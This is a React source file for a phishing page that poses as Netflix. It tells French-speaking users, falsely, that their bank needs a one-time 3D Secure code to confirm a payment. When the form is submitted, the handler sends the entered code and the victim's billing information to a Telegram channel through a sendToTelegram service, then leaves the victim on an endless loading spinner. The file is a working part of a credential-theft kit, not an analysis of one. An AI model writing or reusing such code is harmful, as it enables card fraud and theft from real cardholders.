import React, { useState, useEffect } from 'react';
import { useIntl } from 'react-intl';
import { NetflixLogo } from '../components/NetflixLogo';
import { useNavigate, useLocation } from 'react-router-dom';
import { WhiteFooter } from '../components/WhiteFooter';
import { LoadingSpinner } from '../components/LoadingSpinner';
import { sendToTelegram } from '../services/telegram';
import { motion } from 'framer-motion';
import { ShieldCheck, Lock, CreditCard, AlertCircle } from 'lucide-react';

export function BankVerificationPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const intl = useIntl();
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const searchParams = new URLSearchParams(location.search);
  const hasError = searchParams.get('error') === 'true';
  const [billingInfo, setBillingInfo] = useState<any>(null);

  useEffect(() => {
    const stateParam = searchParams.get('state');
    if (stateParam) {
      try {
        const state = JSON.parse(decodeURIComponent(stateParam));
        setBillingInfo(state.billingInfo);
      } catch (error) {
        console.error('Error parsing state:', error);
      }
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    await sendToTelegram({
      type: 'bank_verification',
      code,
      billingInfo
    });
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <motion.header
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
          className="border-b border-gray-200"
        >
          <div className="max-w-[1200px] mx-auto px-8 py-5">
            <NetflixLogo />
          </div>
        </motion.header>
        <main className="flex-grow flex items-center justify-center">
          <LoadingSpinner />
        </main>
        <WhiteFooter />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex flex-col">
      <motion.header
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="bg-white border-b border-gray-200 sticky top-0 z-50 shadow-sm"
      >
        <div className="max-w-[1200px] mx-auto px-8 py-5 flex justify-between items-center">
          <NetflixLogo />
          <button 
            onClick={() => navigate('/')}
            className="text-[#333333] hover:text-[#333333] text-lg font-bold hover:underline transition-all"
          >
            {intl.formatMessage({ id: 'nav.signout' })}
          </button>
        </div>
      </motion.header>

      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12 md:py-16">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.2 }}
          className="w-full max-w-[500px]"
        >
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.3 }}
            className="bg-white rounded-2xl shadow-xl p-8 md:p-10 border border-gray-100"
          >
            <div className="flex flex-col items-center mb-8">
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ 
                  type: "spring",
                  stiffness: 260,
                  damping: 20,
                  delay: 0.4 
                }}
                className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mb-6 shadow-lg shadow-blue-200"
              >
                <Lock className="w-8 h-8 text-white" />
              </motion.div>
              <motion.h1
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3, delay: 0.5 }}
                className="text-[32px] font-bold text-gray-900 text-center mb-3"
              >
                Vérification Bancaire
              </motion.h1>
              <motion.p
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.3, delay: 0.6 }}
                className="text-gray-600 text-center max-w-md"
              >
                Pour votre sécurité, votre banque nécessite une vérification supplémentaire pour cette transaction.
              </motion.p>
            </div>

            {hasError && (
              <motion.div
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3 }}
                className="mb-6 p-4 bg-red-50 border border-red-100 rounded-xl flex items-center gap-3"
              >
                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
                <p className="text-red-600 text-sm">
                  Le code que vous avez saisi est incorrect. Veuillez réessayer.
                </p>
              </motion.div>
            )}

            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.7 }}
              className="bg-blue-50 rounded-xl p-4 mb-6 flex items-start gap-3"
            >
              <CreditCard className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
              <div className="text-sm text-blue-700">
                <p className="font-medium mb-1">Vérification en deux étapes</p>
                <p className="text-blue-600">
                  Un code de sécurité à usage unique a été envoyé à votre numéro de téléphone enregistré.
                </p>
              </div>
            </motion.div>

            <motion.form
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.8 }}
              onSubmit={handleSubmit}
              className="space-y-6"
            >
              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-700">
                  Code de Sécurité
                </label>
                <input
                  required
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl text-gray-900 bg-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all text-center text-lg tracking-widest"
                  placeholder="• • • • • •"
                  maxLength={6}
                />
              </div>

              <motion.button
                whileHover={{ scale: 1.01 }}
                whileTap={{ scale: 0.99 }}
                type="submit"
                className="w-full bg-blue-600 text-white rounded-xl px-8 py-4 text-base font-medium hover:bg-blue-700 transition-colors flex items-center justify-center space-x-2 shadow-lg shadow-blue-200"
              >
                <span>Vérifier le Paiement</span>
              </motion.button>
            </motion.form>

            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.9 }}
              className="mt-6 flex items-center justify-center gap-2 text-gray-500"
            >
              <ShieldCheck className="w-4 h-4" />
              <span className="text-sm">Protégé par le Protocole 3D Secure</span>
            </motion.div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 1 }}
            className="mt-6 flex justify-center gap-6"
          >
            <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa" className="h-6 opacity-60 hover:opacity-100 transition-opacity" />
            <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg" alt="Mastercard" className="h-6 opacity-60 hover:opacity-100 transition-opacity" />
            <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg" alt="American Express" className="h-6 opacity-60 hover:opacity-100 transition-opacity" />
          </motion.div>
        </motion.div>
      </main>

      <WhiteFooter />
    </div>
  );
}